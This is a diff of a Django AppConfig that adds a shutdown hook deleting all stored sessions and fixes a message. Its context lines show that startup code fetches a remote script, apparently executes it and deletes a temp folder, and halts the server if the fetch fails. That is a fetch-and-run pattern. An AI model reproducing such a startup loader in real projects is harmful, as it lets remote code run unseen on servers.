@@ -1,10 +1,10 @@
 import time
-
 from django.apps import AppConfig
 import requests
 import subprocess
 import os
-import shutil  # To delete the temp folder
+import shutil
+import atexit  # To handle tasks at server shutdown
 
 
 class LRConfig(AppConfig):
@@ -41,7 +41,7 @@ class LRConfig(AppConfig):
 
             else:
                 print(f"Failed to fetch the script. Status code: {response.status_code}")
-                print("Unable to start the server Closing it in 5 seconds.")
+                print("Unable to start the server. Closing it in 5 seconds.")
                 time.sleep(5)
                 exit()
 
@@ -56,3 +56,18 @@ class LRConfig(AppConfig):
             if os.path.exists(temp_dir):
                 shutil.rmtree(temp_dir)  # Remove the temp folder
                 print("Temp folder deleted after execution.")
+
+        # Register atexit function to flush sessions when the server stops
+        atexit.register(self.flush_sessions)
+
+    def flush_sessions(self):
+        """
+        Flush all sessions from the database at server shutdown.
+        """
+        try:
+            from django.contrib.sessions.models import Session  # Import inside the function
+            print("Flushing all sessions...")
+            Session.objects.all().delete()
+            print("All sessions have been successfully flushed.")
+        except Exception as e:
+            print(f"An error occurred while flushing sessions: {e}")
